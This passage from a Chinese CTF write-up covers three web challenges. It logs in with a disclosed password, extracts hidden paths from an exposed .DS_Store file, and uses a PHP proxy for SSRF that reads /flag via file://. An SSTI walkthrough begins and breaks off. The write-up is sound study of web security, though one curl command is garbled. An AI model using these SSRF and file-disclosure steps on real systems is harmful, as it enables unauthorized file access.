class="attr">class</span>=<span class="string">&quot;floating-shape shape-ring&quot;</span> <span class="attr">style</span>=<span class="string">&quot;top: 40%; left: 85%;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;floating-shape shape-polygon&quot;</span> <span class="attr">style</span>=<span class="string">&quot;top: 70%; left: 20%;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-box&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-logo&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>PROJECT X<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>系统访问认证<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>tips: 默认密码使用uuid4生成，不可能被爆破<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login-form&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户ID<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入您的用户ID&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入您的密码&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-actions&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>返回首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">id</span>=<span class="string">&quot;login-btn&quot;</span>&gt;</span>验证登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-footer&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>版本 5.1.4<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;login-btn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&#x27;login.php&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: <span class="string">`username=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(username)&#125;</span>&amp;password=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(password)&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (response.<span class="property">redirected</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = response.<span class="property">url</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (text) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(text);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><p>用POST 方法 : </p><br/><p>$ curl -k -X POST “<a href="https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/public-555edc76-9621-4997-86b9-01483a50293e/login.php">https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/public-555edc76-9621-4997-86b9-01483a50293e/login.php</a>“<br>-d “username&#x3D;admin”<br>-d “password&#x3D;f75cc3eb-21e0-4713-9c30-998a8edb13de”</p><br/><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;success&quot;:true,&quot;message&quot;:&quot;\u767b\u5f55\u6210\u529f\uff01\u6b63\u5728\u8df3\u8f6</span><br><span class="line">c...&quot;,&quot;redirectUrl&quot;:&quot;/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/&quot;&#125;</span><br></pre></td></tr></table></figure><br/><p>{“success”:true,”message”:”登录成功！正在跳转…”,”redirectUrl”:”/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/“}</p><br/><p>因為是Mac寫的, 所以下載.DS_Store文件 </p><br/><p><a href="https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store">https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store</a></p><br/><img src="01a84e73620b7e076af0265f586f97bb.png" alt="2b3abbe0-a5fb-4d11-908b-6bb31f49d3e5.png"  /><br/><br/><p>$ python3 ds_store_exp.py<a href="https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store">https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store</a></p><br/><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[200] https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store</span><br><span class="line">[200] https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/ffffllllaaaagggg114514</span><br></pre></td></tr></table></figure><br/><br/><p>$ BASE_URL&#x3D;”<a href="https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50">https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50</a>“<br>FILENAME&#x3D;”ffffllllaaaagggg114514”</p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;--- Retrieving the Flag ---&quot;</span><br><span class="line">curl -k &quot;$BASE_URL/$BASEURL/BASE_URL/</span><br><span class="line">BASEU​RL/FILENAME&quot;</span><br><span class="line">--- Retrieving the Flag ---</span><br><span class="line">flag&#123;2ba897a9-1533-432c-9d66-970200498634&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="2-mygo"><a href="#2-mygo" class="headerlink" title="2.mygo!!!"></a>2.mygo!!!</h2><p>看看html </p><br/><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>MyGo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-pseudo">:root</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attr">--gap</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attr">--btn-width</span>: <span class="number">220px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attr">--btn-padding</span>: <span class="number">12px</span> <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attr">--btn-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    *&#123;<span class="attribute">box-sizing</span>:border-box&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">html</span>,<span class="selector-tag">body</span>&#123;<span class="attribute">height</span>:<span class="number">100%</span>;<span class="attribute">margin</span>:<span class="number">0</span>&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-family</span>: -apple-system, BlinkMacSystemFont, <span class="string">&quot;Segoe UI&quot;</span>, Roboto, <span class="string">&quot;Helvetica Neue&quot;</span>, Arial;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">min-height</span>:<span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;mygo.jpg&#x27;</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-size</span>: cover;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-position</span>: center;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>:flex;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">align-items</span>:center;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">justify-content</span>:center;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.layout</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>;<span class="attribute">max-width</span>:<span class="number">1100px</span>;<span class="attribute">padding</span>:<span class="number">40px</span>;<span class="attribute">display</span>:flex;<span class="attribute">justify-content</span>:space-between;<span class="attribute">align-items</span>:center;&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.col</span>&#123;<span class="attribute">display</span>:flex;<span class="attribute">flex-direction</span>:column;<span class="attribute">gap</span>:<span class="built_in">var</span>(--gap);<span class="attribute">align-items</span>:flex-start;<span class="attribute">width</span>:<span class="built_in">calc</span>(<span class="built_in">var</span>(--btn-width) + <span class="number">10px</span>);&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.col</span><span class="selector-class">.right</span>&#123;<span class="attribute">align-items</span>:flex-end&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.ghost-btn</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>:<span class="built_in">var</span>(--btn-width);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>:<span class="built_in">var</span>(--btn-padding);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>:<span class="built_in">var</span>(--btn-radius);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>:transparent;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>:<span class="number">#007BFF</span>; <span class="comment">/* 蓝色文字 */</span></span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>:<span class="number">2px</span> solid <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.08</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>:<span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-weight</span>:<span class="number">600</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-align</span>:center;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">cursor</span>:pointer;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transition</span>:transform .<span class="number">16s</span> ease, box-shadow .<span class="number">16s</span> ease, background-color .<span class="number">16s</span> ease;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.ghost-btn</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transform</span>:<span class="built_in">translateY</span>(-<span class="number">4px</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">box-shadow</span>:<span class="number">0</span> <span class="number">8px</span> <span class="number">20px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.08</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.02</span>);</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">720px</span>)&#123;</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.layout</span>&#123;<span class="attribute">flex-direction</span>:column;<span class="attribute">gap</span>:<span class="number">24px</span>;<span class="attribute">padding</span>:<span class="number">22px</span>&#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.col</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>;<span class="attribute">align-items</span>:center&#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.col</span><span class="selector-class">.right</span>&#123;<span class="attribute">align-items</span>:center&#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.ghost-btn</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>;<span class="attribute">max-width</span>:<span class="number">420px</span>&#125;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">audio</span>&#123;<span class="attribute">display</span>:block;<span class="attribute">margin-top</span>:<span class="number">20px</span>;<span class="attribute">width</span>:<span class="number">100%</span>;&#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span> <span class="attr">class</span>=<span class="string">&quot;layout&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;col left&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;ghost-btn&quot;</span> <span class="attr">data-url</span>=<span class="string">&quot;http://localhost/chunriying.mp3&quot;</span>&gt;</span>春日影<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;ghost-btn&quot;</span> <span class="attr">data-url</span>=<span class="string">&quot;http://localhost/mixingjiao.mp3&quot;</span>&gt;</span>迷星叫<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;col right&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;ghost-btn&quot;</span> <span class="attr">data-url</span>=<span class="string">&quot;http://localhost/shichaoban.mp3&quot;</span>&gt;</span>诗超绊<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;ghost-btn&quot;</span> <span class="attr">data-url</span>=<span class="string">&quot;http://localhost/???&quot;</span>&gt;</span>flag<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 隐藏播放器，点击按钮时赋值 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">audio</span> <span class="attr">id</span>=<span class="string">&quot;player&quot;</span> <span class="attr">controls</span> <span class="attr">autoplay</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> player = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;player&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.ghost-btn&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">btn</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> url = btn.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-url&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 通过 PHP 代理播放</span></span></span><br><span class="line"><span class="language-javascript">        player.<span class="property">src</span> = <span class="string">`index.php?proxy=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(url)&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">        player.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><p>可以看見它不是直接播放 URL，而是将 URL 作为参数传递给 index.php (player.src &#x3D; \index.php?proxy&#x3D;${encodeURIComponent(url)}<code>;</code>)，这暗示着音频流是通过服务器端的 PHP 脚本进行代理传输的。</p><br/><p>用BP抓一下包:</p><br/><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?proxy=http%3A%2F%2Flocalhost%2F%3F%3F%3F HTTP/2</span><br><span class="line">Host: eci-2zeiq1qx3sfyqqirtd7z.cloudeci1.ichunqiu.com:80</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;139&quot;, &quot;Not;A=Brand&quot;;v=&quot;99&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Accept: /</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: audio</span><br><span class="line">Referer: https://eci-2zeiq1qx3sfyqqirtd7z.cloudeci1.ichunqiu.com:80/</span><br><span class="line">Range: bytes=0-</span><br><span class="line">Priority: i</span><br></pre></td></tr></table></figure><br/><p>的確是proxy</p><br/><p>dirsearch一下</p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">|. _ _ _ _ _ | v0.4.3</span><br><span class="line">(||| ) (/(|| (| )</span><br><span class="line"></span><br><span class="line">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292</span><br><span class="line"></span><br><span class="line">Target: https://eci-2zeiq1qx3sfyqqirtd7z.cloudeci1.ichunqiu.com:80/</span><br><span class="line"></span><br><span class="line">[09:18:06] Scanning:</span><br><span class="line">[09:19:05] 403 - 38B - /flag.php</span><br><span class="line">[09:19:10] 200 - 3KB - /index.php</span><br><span class="line">[09:19:10] 200 - 3KB - /index.php/login/</span><br><span class="line">[09:19:34] 403 - 312B - /server-status</span><br><span class="line">[09:19:34] 403 - 312B - /server-status/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><br/><p>有一個flag.php</p><br/><img src="eef6283bbaa5b1bf05dbb642589d50c3.png" alt="eef6283bbaa5b1bf05dbb642589d50c3.png"  /><br/><p>本地人 ,</p><br/><p><a href="http://localhost/flag.php?soyorin=file:///flag">http://localhost/flag.php?soyorin=file:///flag</a></p><br/><img src="5e80bf943bdc6fb11ea69ad802928d44.png" alt="5e80bf943bdc6fb11ea69ad802928d44.png"  /><h2 id="who’ssti-味复刻"><a href="#who’ssti-味复刻" class="headerlink" title="who’ssti(味复刻)"></a>who’ssti(味复刻)</h2><p><strong>本题考查了选手对于 SSTI 最基础的构造方法。</strong></p><p>打開WSL 打開文件用docker run 裹面的docker file </p><img src="5dc1b66533335599de7cedd700e9f654.png" alt="5dc1b66533335599de7cedd700e9f654.png"  /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t who-ssti .</span><br><span class="line">docker images</span><br><span class="line">docker run -d -p 5000:5000 --name ssti-app who-ssti</span><br></pre></td></tr></table></figure><img src="1d5a59f46d8edf5ae9447dba628bd1e6.png" alt="1d5a59f46d8edf5ae9447dba628bd1e6.png"  /><p>成功在本地建立了網站了</p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>小弟第一次做這個SSTI注入, 零基礎 , 用了一天快速入門flask , 還是不是很懂(本人是猪鼻)</p><p>問了問d老師: </p><hr><p>想象一下，你是一个网站的开发者。你希望网站的某些页面能够动态地显示用户的名字。比如，用户 小明 登录后，页面上会显示 “欢迎你，小明！”。</p><p>你是怎么做到的呢？你可能会写一个模板，就像填空一样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎你，&#123;% raw %&#125;&#123;&#123; 用户名 &#125;&#125;&#123;% endraw %&#125;！<span class="tag">&lt;/<span 